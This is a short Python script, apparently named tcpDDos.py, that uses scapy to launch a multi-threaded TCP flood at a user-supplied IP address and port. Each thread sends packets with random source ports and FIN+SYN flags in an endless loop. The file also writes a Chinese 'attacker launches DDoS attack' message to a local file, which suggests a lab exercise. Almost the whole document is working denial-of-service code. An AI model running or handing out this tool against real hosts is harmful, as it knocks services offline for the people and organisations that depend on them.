from scapy.all import *
from time import sleep
from threading import Thread
import random

if len(sys.argv) !=  4:
	print("Usage: ./tcpDDos.py [Target IP] [Port] [Threads]")
	print("Example: ./tcpDDos.py 1.1.1.1 80 20")
	sys.exit()

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

sleep(10)
with open('/home/ubuntu/msg.txt', 'w') as fp:
	fp.write('攻击者发起DDos攻击...')

print("start DDos...")
print("press Ctrl+C to stop...")

def synflood(target, port):
	while 1:
		x = random.randint(1024, 65535)
		send(IP(dst=target)/TCP(dport=port, sport=x, flags='FS'), verbose=0)
		sleep(0.15)

for i in range(threads):
	Thread(target=synflood, args=(target,port)).start()

while 1:
	sleep(0)
